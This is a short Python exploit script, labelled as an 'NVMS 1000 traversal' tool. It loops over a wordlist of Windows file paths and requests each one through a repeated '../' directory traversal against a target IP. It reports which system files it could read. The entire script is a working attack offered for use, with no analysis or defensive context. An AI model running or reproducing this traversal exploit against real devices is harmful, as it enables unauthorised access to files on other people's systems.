#!/usr/bin/env python
import requests

wordlist = open("windows.txt", "r")
seperator = '==============================================='

ip = '192.168.0.1'
reqhead = {'Host': ip, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7', 'Connection': 'close' }
url = 'http://' + ip
backdir = '/../../../../../../../../../../../../'

foundfiles = []

print(seperator)
for x in wordlist:
                  check = requests.get(url + backdir + x, headers=reqhead)
                  if check.status_code == 200:
			print('Resp code: ' + str(check.status_code) + ' : ' + 'Found valid filename: ' + url + backdir + x)
			foundfiles.append(x)
		  elif check.status_code != 200:
			print('Resp code: ' + str(check.status_code) + ' : ' + 'Unable to get file by path: ' + x)
print(seperator)
print("We've located the below files during this scan: ")
print(seperator)
for item in foundfiles:
	print(item)
print(seperator)
print('Developed by JoinFreeMe - NVMS 1000 traversal')
print(seperator)
